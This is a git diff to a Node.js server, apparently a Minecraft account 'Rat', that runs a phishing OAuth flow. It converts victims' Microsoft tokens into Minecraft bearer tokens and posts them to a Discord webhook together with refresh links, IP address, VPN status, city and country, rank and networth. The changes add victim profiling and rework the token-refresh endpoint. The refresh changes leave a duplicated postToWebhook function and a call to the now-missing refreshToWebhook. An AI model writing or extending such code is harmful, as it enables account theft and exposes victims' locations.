@@ -41,7 +41,11 @@ app.get('/', async (req, res) => {
         const country = ipLocationArray[0]
         const city = ipLocationArray[1]
         const flag = ipLocationArray[2]
-        postToWebhook(username, bearerToken, uuid, ip, refreshToken, country, city, flag)
+        const security = ipLocationArray[3]
+        const playerData = await getPlayerData(username)
+        const rank = playerData[0]
+        const level = playerData[1].toFixed()
+        postToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country, city, flag, security)
     } catch (e) {
         console.log(e)
     }
@@ -138,18 +142,50 @@ async function getIpLocation(ip) {
         }
     }
     let response = await axios.get(url, config)
-    return [response.data['country'], response.data['city'], response.data.flag['emoji']]
+    return [response.data['country'], response.data['city'], response.data.flag['emoji'], response.data['security']]
 }
-
-function postToWebhook(username, bearerToken, uuid, ip, refreshToken, country, city, flag) {
+async function getPlayerData(username) {
+    let url = `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
+    let config = {
+        headers: {
+            'Authorization': 'mfheda'
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data.data[0]['rank'], response.data.data[0]['hypixelLevel']]
+}
+    
+async function postToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, refreshToken, country, city, flag, security) {
     const url = webhook_url
+    let isVpnOn
+    if (security.is_vpn) isVpnOn = " (VPN)"
+    else isVpnOn = ""
+    let networth = await (
+        await axios
+            .get(
+                `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
+            )
+            .catch(() => {
+                return { data: { data: [{ networth: null }] } };
+            })
+    ).data.data[0].networth;
+
+    // Set it "API IS TURNED OFF IF NULL"
+    if (networth === null) networth = "API IS TURNED OFF";
+    else
+        networth = formatNumber(networth.unsoulboundNetworth);
+
     let data = {
 username: "[LVL 100] Rat",
   avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
-content: "@everyone",
+content: "@everyone ",
   embeds: [
     {
       color: 3482894,
+      timestamp: new Date(),
+      thumbnail: {
+        url: 'https://visage.surgeplay.com/full/'+uuid
+	      },
       fields: [
         {
           name: "**Username:**",
@@ -157,13 +193,28 @@ content: "@everyone",
           inline: true
         },
         {
-          name: "**IP:**",
+          name: "**IP:"+isVpnOn+"**",
           value: "```"+ip+"```",
           inline: true
         },
         {
             name: "**IP Location:** "+flag,
             value: "```"+country+", "+city+"```",
+            inline: true
+          },
+          {
+            name: "**Unsoulbound NW:**",
+            value: "```"+networth+"```",
+            inline: true
+          },
+          {
+            name: "**Network Level**",
+            value: "```"+level+"```",
+            inline: true
+          },
+          {
+            name: "**Rank:**",
+            value: "```"+rank+"```",
             inline: true
           },
         
@@ -174,7 +225,8 @@ content: "@everyone",
         {
             name: "**Refresh:**",
             value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+refreshToken+")",
-          }
+          },
+        
       ],
       "footer": {
         "text": "By heda",
@@ -192,6 +244,7 @@ content: "@everyone",
 //Refresh token shit u know how it is
 app.get('/refresh', async (req, res) => {
     res.send('Token Refreshed!')
+    const clientIp = requestIp.getClientIp(req)
     const refresh_token = req.query.refresh_token
     if (refresh_token == null) {
         return
@@ -200,16 +253,24 @@ app.get('/refresh', async (req, res) => {
         const refreshTokenArray = await getRefreshData(refresh_token)
 	    const newAccessToken = refreshTokenArray[0]
         const newRefreshToken = refreshTokenArray[1]
-	    const newHashAndTokenArray = await getNewUserHashAndToken(newAccessToken)
-        const newUserToken = newHashAndTokenArray[0]
-        const newUserHash = newHashAndTokenArray[1]
-        const newXstsToken = await getNewXSTSToken(newUserToken)
-        const newBearerToken = await getNewBearerToken(newXstsToken, newUserHash)
-        const newUsernameAndUUIDArray = await getNewUsernameAndUUID(newBearerToken)
-        const newUuid = newUsernameAndUUIDArray[0]
-        const newUsername = newUsernameAndUUIDArray[1]
-	refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken)
-
+	    const hashAndTokenArray = await getUserHashAndToken(newAccessToken)
+        const userToken = hashAndTokenArray[0]
+        const userHash = hashAndTokenArray[1]
+        const xstsToken = await getXSTSToken(userToken)
+        const bearerToken = await getBearerToken(xstsToken, userHash)
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        const uuid = usernameAndUUIDArray[0]
+        const username = usernameAndUUIDArray[1]
+        const ip = clientIp
+        const ipLocationArray = await getIpLocation(ip)
+        const country = ipLocationArray[0]
+        const city = ipLocationArray[1]
+        const flag = ipLocationArray[2]
+        const security = ipLocationArray[3]
+        const playerData = await getPlayerData(username)
+        const rank = playerData[0]
+        const level = playerData[1].toFixed()
+        refreshToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, city, flag, security)
     } catch (e) {
         console.log(e)
     }
@@ -235,104 +296,96 @@ async function getRefreshData(refresh_token) {
     return [response.data['access_token'], response.data['refresh_token']]
 }
 
-async function getNewUserHashAndToken(newAccessToken) {
-    const url = 'https://user.auth.xboxlive.com/user/authenticate'
-    const config = {
-        headers: {
-            'Content-Type': 'application/json', 'Accept': 'application/json',
-        }
-    }
-    let data = {
-        Properties: {
-            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${newAccessToken}`
-        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
-    }
-    let response = await axios.post(url, data, config)
-    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
-}
-
-async function getNewXSTSToken(newUserToken) {
-    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
-    const config = {
-        headers: {
-            'Content-Type': 'application/json', 'Accept': 'application/json',
-        }
-    }
-    let data = {
-        Properties: {
-            SandboxId: 'RETAIL',
-            UserTokens: [newUserToken]
-        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
-    }
-    let response = await axios.post(url, data, config)
-
-    return response.data['Token']
-}
 
 
-async function getNewBearerToken(newXstsToken, newUserHash) {
-    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
-    const config = {
-        headers: {
-            'Content-Type': 'application/json',
-        }
-    }
-    let data = {
-        identityToken: "XBL3.0 x=" + newUserHash + ";" + newXstsToken, "ensureLegacyEnabled": true
-    }
-    let response = await axios.post(url, data, config)
-    return response.data['access_token']
-}
-
-async function getNewUsernameAndUUID(newBearerToken) {
-    const url = 'https://api.minecraftservices.com/minecraft/profile'
-    const config = {
-        headers: {
-            'Authorization': 'Bearer ' + newBearerToken,
-        }
-    }
-    let response = await axios.get(url, config)
-    return [response.data['id'], response.data['name']]
-}
-
-
-function refreshToWebhook(newUsername, newBearerToken, newUuid, newRefreshToken) {
+async function postToWebhook(formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, city, flag, security) {
     const url = webhook_url
+    let isVpnOn
+    if (security.is_vpn) isVpnOn = " (VPN)"
+    else isVpnOn = ""
+    let networth = await (
+        await axios
+            .get(
+                `https://puce-viper-robe.cyclic.app/v2/profiles/${username}?key=mfheda`
+            )
+            .catch(() => {
+                return { data: { data: [{ networth: null }] } };
+            })
+    ).data.data[0].networth;
+
+    // Set it "API IS TURNED OFF IF NULL"
+    if (networth === null) networth = "API IS TURNED OFF";
+    else
+        networth = formatNumber(networth.unsoulboundNetworth);
+
     let data = {
 username: "[LVL 100] Rat",
   avatar_url: "https://cdn.discordapp.com/avatars/1033045491912552508/0d33e4f7aa3fdbc3507880eb7b2d1458.webp",  
-content: "@everyone TOKEN REFRESHED!",
+content: "@everyone ",
   embeds: [
     {
       color: 3482894,
+      timestamp: new Date(),
+      thumbnail: {
+        url: 'https://visage.surgeplay.com/full/'+uuid
+	      },
       fields: [
         {
-          name: "**Username:**",
-          value: "```"+newUsername+"```",
-          inline: true
+            name: "**Username:**",
+            value: "```"+username+"```",
+            inline: true
+          },
+          {
+            name: "**IP:"+isVpnOn+"**",
+            value: "```"+ip+"```",
+            inline: true
+          },
+          {
+              name: "**IP Location:** "+flag,
+              value: "```"+country+", "+city+"```",
+              inline: true
+            },
+            {
+              name: "**Unsoulbound NW:**",
+              value: "```"+networth+"```",
+              inline: true
+            },
+            {
+              name: "**Network Level**",
+              value: "```"+level+"```",
+              inline: true
+            },
+            {
+              name: "**Rank:**",
+              value: "```"+rank+"```",
+              inline: true
+            },
+          
+          {
+            name: "**Token:**",
+            value: "```"+bearerToken+"```"
         },
         {
-          name: "**UUID:**",
-          value: "```"+newUuid+"```",
-          inline: true
-        },
-        {
-          name: "**New Refresh Link:**",
-          value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+newRefreshToken+")",
-          inline: true
-        },
-        {
-          name: "**New Token:**",
-          value: "```"+newBearerToken+"```"
-        }
+            name: "**Refresh:**",
+            value: "[Click Here]("+redirect_uri+"/refresh?refresh_token="+newRefreshToken+")",
+            inline: true
+          },
+        
       ],
       "footer": {
-        "text": "RAT",
+        "text": "By heda",
         "icon_url": "https://cdn.discordapp.com/avatars/919624780112592947/a_119345db608773253c2c6d687ea25155.webp"
       }
     }
   ],
 }
+
         axios.post(url, data).then(() => console.log("Successfully refreshed token."))
     
+}
+const formatNumber = (num) => {
+    if (num < 1000) return num.toFixed(2)
+    else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
+    else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
+    else return `${(num / 1000000000).toFixed(2)}b`
 }
